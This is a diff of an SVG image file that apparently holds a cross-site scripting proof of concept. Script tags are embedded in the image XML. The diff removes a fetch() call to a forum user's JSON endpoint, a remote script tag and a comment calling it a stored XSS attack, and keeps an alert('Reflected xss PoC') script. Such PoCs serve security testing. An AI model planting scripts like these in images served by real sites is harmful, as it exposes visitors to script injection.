@@ -37,18 +37,10 @@
        d="m 107.79557,-10.430538 -7.33315,-0.02213 -3.647402,-6.361755 3.685742,-6.339624 7.33314,0.02213 3.64741,6.361756 z"
        style="fill:#131f6b;fill-opacity:1;stroke-width:0.05937638"
        transform="scale(1,-1)" />
-  <!-- The below lines were added in a text editor to the image XML. This is the stored XSS attack. -->
+     
   <script type="text/javascript">
     alert("Reflected xss PoC")
-    fetch('https://forum.celo.org/u/hfje.json', {
-    method: 'GET',
-    headers: {
-        'Accept': 'application/json',
-    },
-})
-.then(response => response.text())
-.then(text => console.log(text))
   </script>
-     <script src="https://forum.celo.org/u/hfje.json?test" />
-  </g>
+  
+   </g>
 </svg>
